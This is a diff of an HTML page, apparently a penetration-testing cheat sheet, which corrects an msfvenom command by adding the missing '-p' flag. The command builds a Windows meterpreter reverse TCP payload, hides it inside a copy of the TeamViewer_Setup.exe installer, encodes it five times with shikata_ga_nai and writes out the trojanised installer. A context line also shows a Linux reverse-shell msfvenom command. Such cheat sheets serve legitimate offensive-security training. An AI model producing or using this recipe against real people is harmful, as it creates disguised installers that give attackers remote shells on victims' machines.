@@ -80,7 +80,7 @@ msfvenom <span class="nt">-p</span> linux/x64/shell_reverse_tcp <span class="nt"
 <span class="c"># embed it in a TeamViewer_Setup.exe executable file,</span>
 <span class="c"># encode the payload 5 times with shikata_ga_nai,</span>
 <span class="c"># and continue the normal execution of the app by spawning the payload in a separate thread.</span>
-msfvenom windows/x86/meterpreter_reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>&lt;listen-ip&gt; <span class="nv">LPORT</span><span class="o">=</span>&lt;listen-port&gt; <span class="nt">-k</span> <span class="nt">-x</span> ~/Downloads/TeamViewer_Setup.exe <span class="nt">-e</span> x86/shikata_ga_nai <span class="nt">-a</span> x86 <span class="nt">--platform</span> windows <span class="nt">-o</span> ~/Desktop/TeamViewer_Setup.exe <span class="nt">-i</span> 5
+msfvenom <span class="nt">-p</span> windows/x86/meterpreter_reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>&lt;listen-ip&gt; <span class="nv">LPORT</span><span class="o">=</span>&lt;listen-port&gt; <span class="nt">-k</span> <span class="nt">-x</span> ~/Downloads/TeamViewer_Setup.exe <span class="nt">-e</span> x86/shikata_ga_nai <span class="nt">-a</span> x86 <span class="nt">--platform</span> windows <span class="nt">-o</span> ~/Desktop/TeamViewer_Setup.exe <span class="nt">-i</span> 5
 </code></pre></div>
 
     </main>
